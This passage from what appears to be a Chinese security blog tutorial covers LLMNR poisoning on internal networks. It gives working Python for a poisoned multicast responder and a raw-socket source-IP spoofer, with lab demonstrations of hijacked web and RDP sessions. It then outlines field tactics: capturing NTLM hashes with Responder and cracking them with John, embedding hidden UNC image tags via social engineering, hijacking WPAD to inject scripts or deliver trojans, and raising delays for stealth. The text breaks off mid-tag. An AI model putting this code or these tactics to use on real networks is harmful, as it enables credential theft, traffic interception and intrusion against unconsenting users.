src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160747-38c1da50-d413-1.png" alt="应答的数据包详细结构"></p><h2 id="0x03-编程实现-LLMNR-的质询和应答"><a href="#0x03-编程实现-LLMNR-的质询和应答" class="headerlink" title="0x03 编程实现 LLMNR 的质询和应答"></a>0x03 编程实现 LLMNR 的质询和应答</h2><p>通过上面的内容，可以很直观的理解 LLMNR 进行名称解析的详细过程，使用 Python 可以快速实现 LLMNR 协议的质询和应答编程。<br>LLMNR 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br><br>        self.IsIPv4 = <span class="hljs-literal">True</span><br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;224.0.0.252&#x27;</span> <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;FF02::1:3&#x27;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.s_family = socket.AF_INET <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> socket.AF_INET6<br><br>        self.QueryType = <span class="hljs-string">&quot;IPv4&quot;</span><br>        self.lqs = socket.socket(self.s_family, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;LENGTH&quot;</span>    <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;TYPE&quot;</span>      <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br>        namelen = <span class="hljs-built_in">len</span>(self.name)<br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>        self.data = self.data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;&gt;&quot;</span>+<span class="hljs-built_in">str</span>(namelen)+<span class="hljs-string">&quot;s&quot;</span>, self.name))<br>        self.data = self.data.replace(<span class="hljs-string">&quot;TYPE&quot;</span>,  <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-keyword">if</span> self.QueryType == <span class="hljs-string">&quot;IPv4&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;\x00\x1c&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LLMNR Querying... -&gt; %s&quot;</span> % self.name<br>            self.lqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.lqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Query(<span class="hljs-string">&quot;Wooyun&quot;</span>)<br>    llmnr.Query()<br></code></pre></td></tr></table></figure><p>要对 LLMNR 协议的质询请求进行应答，首先要将本机加入多播（或组播）组中，所使用的协议为 IGMP。具体编程实现的方式可以直接构造数据包使用 UDP 发送，也可以使用套接字提供的 setsockopt 函数进行设置。</p><p>应答的实现方式很简单，创建一个 UDP 套接字使用 setsockopt 函数加入多播组并监听 5355 端口，当然也可以使用非阻塞的 SocketServer 模块实现，效果更佳。</p><p>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>            <span class="hljs-string">&quot;TID&quot;</span>               <span class="hljs-comment"># Tid</span><br>            <span class="hljs-string">&quot;\x80\x00&quot;</span>          <span class="hljs-comment"># Flags  Query(0x0000)? or Response(0x8000) ?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Question</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Authority RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Additional RRS</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Question Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Question Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Question Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Answer Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Answer Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Answer Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;\x00\x00\x00\x1e&quot;</span>  <span class="hljs-comment"># TTL Default:30s</span><br>            <span class="hljs-string">&quot;\x00\x04&quot;</span>          <span class="hljs-comment"># IP Length</span><br>            <span class="hljs-string">&quot;IPADDR&quot;</span>)           <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.MulADDR  = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br>        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.las.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data, addr = self.las.recvfrom(<span class="hljs-number">1024</span>)<br><br>            tid = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>            namelen = struct.unpack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, data[<span class="hljs-number">12</span>])[<span class="hljs-number">0</span>]<br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">13</span> + namelen]<br><br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br><br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % (self.IPADDR, addr[<span class="hljs-number">0</span>], name)<br>            self.las.sendto(data, addr)<br><br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br>        self.las.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    llmnr.Answser()<br></code></pre></td></tr></table></figure><p>LLMNR 应答执行结果如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160820-4c222a64-d413-1.png" alt="Python 实现 LLMNR 质询与应答1"></p><p>模拟查询主机名称为 <strong>Wooyun</strong> 的结果：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160835-54f37a3a-d413-1.png" alt="Python 实现 LLMNR 质询与应答2"></p><h2 id="0x04-LLMNR-Poison-攻击原理"><a href="#0x04-LLMNR-Poison-攻击原理" class="headerlink" title="0x04 LLMNR Poison 攻击原理"></a>0x04 LLMNR Poison 攻击原理</h2><p>一个完整的正常的 LLMNR 名称解析过程如图 2 所示，由于 LLMNR 使用无连接的 UDP 协议发送广播，之后多播组内的主机可以对发起名称解析的主机进行应答，因此，在这个过程中，攻击者就有机可乘。</p><p>攻击者可以将自己的主机加入到组播组中，当收到其他主机进行名称解析的质询请求，就可以对发起此次名称解析的主机进行“恶意”应答，利用此缺陷进行欺骗攻击的方式称为 <strong>LLMNR Poison 攻击</strong>。</p><p> “恶意”应答过程如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160859-638cf5c6-d413-1.png" alt="攻击者进行“恶意”应答过程图示"></p><p>LLMNR 名称解析的最大缺陷就是，在当前局域网中，无论是否存在主机 B（假定机器名为：SECLAB-HER0IN），只要有主机请求 SECLAB-HER0IN 都会进行一次 LLMNR 名称解析。</p><h2 id="0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话"><a href="#0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话" class="headerlink" title="0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话"></a>0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话</h2><p>由于 UDP 是面向无连接的，所以不存在三次握手的过程，因此，在 LLMNR 名称解析过程中，UDP  的不安全性就体现出来了。攻击者可以伪造源 IP 地址向广播地址发送 LLMNR 名称解析质询，之后攻击者再对这个质询进行应答，完全是一场  <strong>“自导自演”</strong> 的戏。</p><p>修改 UDP 源 IP 的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, time<br><span class="hljs-keyword">from</span> impacket <span class="hljs-keyword">import</span> ImpactDecoder, ImpactPacket<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">UDPSpoof</span>(<span class="hljs-params">src_ip, src_port, dst_ip, dst_port, data</span>):</span><br>    ip = ImpactPacket.IP()<br>    ip.set_ip_src(src_ip)<br>    ip.set_ip_dst(dst_ip)<br><br>    udp = ImpactPacket.UDP()<br>    udp.set_uh_sport(src_port)<br>    udp.set_uh_dport(dst_port)<br><br>    udp.contains(ImpactPacket.Data(data))<br>    ip.contains(udp)<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)<br>    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="hljs-number">1</span>)<br>    s.sendto(ip.get_packet(), (dst_ip, dst_port))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x09&quot;</span>      <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;Her0in-PC&quot;</span>    <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>    ip_src = <span class="hljs-string">&quot;192.168.169.1&quot;</span><br>    ip_dst = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UDP Source IP Spoof %s =&gt; %s for Her0in-PC&quot;</span> % (ip_src, ip_dst))<br>        UDPSpoof(ip_src, <span class="hljs-number">18743</span>,ip_dst , <span class="hljs-number">5355</span>, QueryData)<br>        time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><blockquote><p>为了不要那么暴力，在最后加了个延时，实际上在 LLMNR 应答数据包中有一个 TTL 默认为 30s，在实战中为了隐蔽可以将延时加大。</p></blockquote><p>具体攻击过程如下：</p><ul><li>攻击者（IP：111.111.111.111）伪造受害者（IP：222.222.222.222）向 LLMNR 协议的广播地址发送 LLMNR 质询，请求解析名称为：HER0IN-PC（IP：333.333.333.333） 的 IP；</li><li>攻击者（IP：111.111.111.111）加入多播组收到 “受害者” 的请求，对质询进行响应，将自己的IP（可以是任何 IP）单播给受害者。</li></ul><p>攻击的效果就是，受害者只要使用计算机名称访问 HER0IN-PC 这台主机的任何服务，都会被重定向到攻击者指定的 IP 上。</p><p>测试环境如下：</p><ul><li>攻击者主机 IP：192.168.169.5，启动伪造 IP 进行 LLMNR 广播的恶意程序以及 LLMNR 应答程序</li><li>受害者 IP：192.168.169.3，无需任何操作</li></ul><p>当受害者访问内网某台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160934-78309122-d413-1.png" alt="攻击者主机启动相应的程序，并提供了 WEB 服务"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160943-7d99c9ee-d413-1.png" alt="当受害者访问 win2k3-3a85d681 这台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160954-83e858ec-d413-1.png" alt="受害者原本想访问的 WEB 服务器是 Windows Server 2003 却被攻击者“重定向”到了一台 Linux 主机上"></p><h2 id="0x06-LLMNR-Poison-实战攻击思路"><a href="#0x06-LLMNR-Poison-实战攻击思路" class="headerlink" title="0x06 LLMNR Poison 实战攻击思路"></a>0x06 LLMNR Poison 实战攻击思路</h2><p>在局域网中，名称解析的行为是非常频繁的，只要有使用计算机名称，准确的说是使用 NetBIOS 名称或非 FQDN 域名的地方都会产生名称解析，如  PING 主机名称，使用主机名称连接各种服务等等。Windows 系统也默认启用了 NetBIOS 和 LLMNR，这就使得 LLMNR  Poison 攻击的实战价值有所提升。但实际上在实战中使用 LLMNR Poison 攻击时，会遇到一些问题，如 5355  端口被占用，防火墙拦截等，不过这些小问题都是可以解决的；另外还有一些不可控的客观因素，如网络稳定性等等，但这些问题也不是非常普遍并且不可解决的。</p><p>下面提供几种在实战中可用的 LLMNR Poison 攻击思路，以 <strong>Responder</strong> 做为攻击工具进行演示。</p><h3 id="劫持会话获取-HASH"><a href="#劫持会话获取-HASH" class="headerlink" title="劫持会话获取 HASH"></a>劫持会话获取 HASH</h3><p>通过劫持会话获取受害者的 HASH，有两种常见的攻击场景：</p><h4 id="劫持-SMB-会话获取-HASH"><a href="#劫持-SMB-会话获取-HASH" class="headerlink" title="劫持 SMB 会话获取 HASH"></a>劫持 SMB 会话获取 HASH</h4><p>利用 LLMNR Poison 攻击劫持 SMB 会话与 SMB Relay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是  SMB Relay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用  LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMB Relay  攻击结合起来，提升攻击力。 </p><p>攻击的方式大致为：</p><ul><li>结合社工欺骗受害者访问一个正常的但已嵌入类似于 <code>&lt;img/src=\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 或 <code>&lt;img/src=http:\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 的网页；</li><li>当受害者访问网页后，如果受害者主机系统版本是 Vista 之后的，就会产生 LLMNR 名称解析。</li><li>此时攻击者的主机（已启动了 Responder ）就会收到受害者主机的 HASH；</li><li>当然也可以一直启动 Responder 进行监听，不需要其他额外的操作，只要有主机使用计算机名称请求 SMB 或 WEB 服务就可以得到相应主机的 HASH；</li><li>之后使用 John 破解 SMB 会话劫持到的 HASH。</li></ul><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161019-9324c796-d413-1.png" alt="SMB 会话劫持，获取 HASH"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161027-97d2bfd2-d413-1.png" alt="使用 John 破解 SMB 会话劫持到的 HASH"></p><h4 id="使用-HTTP-401-认证获取-HASH"><a href="#使用-HTTP-401-认证获取-HASH" class="headerlink" title="使用 HTTP 401 认证获取 HASH"></a>使用 HTTP 401 认证获取 HASH</h4><p>使用 HTTP 401 认证同样也可以获取到客户端机器的 HASH，劫持会话进行钓鱼：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161042-a10626c0-d413-1.png" alt="HTTP 401 认证服务器钓鱼"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161056-a967b112-d413-1.png" alt="“钓鱼”攻击获取到了 HASH"></p><h3 id="劫持-WPAD-获取上网记录"><a href="#劫持-WPAD-获取上网记录" class="headerlink" title="劫持 WPAD 获取上网记录"></a>劫持 WPAD 获取上网记录</h3><p>在 Windows 系统中，默认启用了 WPAD 功能，可以对 <strong>IE 浏览器-工具-internet-连接-局域网设置-自动检测设置</strong> 和 <strong>系统服务</strong> 中的 <strong>WinHttpAutoProxySvc</strong> 服务进行开关设置。</p><p>启用了 WPAD 的主机，会持续请求名为 <strong>WPAD</strong> 的主机名称，因此可以利用 LLMNR Poison  攻击更改受害者主机的浏览器代理设置，这样就可以在攻击者自己的代理服务器中看到受害者的上网浏览记录，也可以在受害者正在访问的网页中嵌入任何你想要嵌入的恶意脚本代码，如各种钓鱼、弹框认证、下载文件等等。另外，由于  WPAD 是一个系统的 HTTP 代理设置，所以 Windows 更新也会使用这个代理，这样就可以利用 Windows  更新将木马下载到受害者主机并自动执行。</p><p>但是 WPAD 在实战中也同样会受到各种不可控的客观因素的影响，只有手动设置了浏览器代理配置，通过 WPAD 的代理上网的效果才比较明显。</p><h3 id="“剑走偏锋”-获取服务器密码"><a href="#“剑走偏锋”-获取服务器密码" class="headerlink" title="“剑走偏锋” 获取服务器密码"></a>“剑走偏锋” 获取服务器密码</h3><p>上面已经提到，在局域网中只要有主机使用其他主机的名称请求服务就可以产生名称解析行为，现在假定有这样一个场景，在渗透到内网后，进一步渗透的条件很苛刻，这时候你“黔驴技穷”了，为了能在内网中拿到一台服务器，以便“站稳脚跟”，或许你可以采用“剑走偏锋”的思路，利用  LLMNR Poison 攻击进行 3389 连接欺骗，拿到服务器的密码，这样做的确有些冒险，可是总好过你直接修改 IP 去欺骗登录要好很多！</p><p>测试环境如下：</p><ul><li>一台 Windows Server 2008 （Win2k8 支持 LLMNR）作为管理员的主机，IP：172.16.0.8</li><li>一台 Windows Server 2003 （假定为内网的一台服务器）机器名称：WIN2K3-3A85D681，IP：172.16.0.3</li><li>一台 Windows XP （已开 3389 为了演示效果所用），IP：172.16.0.100</li><li>一台 BT5-R3 攻击者的主机 （启动 Responder），IP：172.16.0.128</li></ul><p>场景如下：</p><p>管理员的主机（Win2k8）连接内网服务器（Win2k3）进行常规维护，攻击者（BT5-R3）利用 LLMNR Poison 攻击劫持了 3389 连接会话，<strong>为了更加明显的演示出攻击效果，我将 3389 连接会话重定向到一台 XP 中</strong>。</p><p>攻击效果如下：</p><p>管理员连接内网服务器，但是被LLMNR Poison攻击劫持，重定向到了XP上：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161109-b12561c4-d413-1.png" alt="管理员连接内网服务器"></p><p>从攻击者的机器中，也可以看到 Responder 做了“恶意”应答，同时，利用 lcx 转发的 3389 也有数据流动，可以从 IP 中判断出来：</p><p><img 